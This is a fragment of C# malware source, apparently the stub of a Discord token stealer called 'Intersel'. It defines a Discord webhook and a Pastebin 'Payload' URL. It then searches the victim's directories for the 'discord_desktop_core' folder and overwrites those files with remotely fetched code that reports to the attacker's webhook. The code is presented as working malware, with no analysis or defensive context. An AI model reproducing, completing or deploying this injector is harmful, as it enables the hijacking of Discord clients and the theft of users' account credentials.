...
namespace InterselStubVersion1
{
    public class Settings
    {
        public static string WebhookProtection = "https://discord.com/api/webhooks/";
        public static string Webhook = "intersel-webhook";
        public static string Payload = "https://pastebin.com/raw/qNmtShd8";
    }
                                        ...
                                        foreach (var item5 in Directory.GetDirectories(item4))
                                        {
                                            if (item5.Contains("discord_desktop_core"))
                                            {
                                                ...
                                                foreach (var item7 in Directory.GetFiles(item5))
                                                {
                                                    ...
                                                    {
                                                        File.WriteAllText(item7, new WebClient().DownloadString(Settings.Payload).Replace("%SCR%", Settings.WebhookProtection + Settings.Webhook));
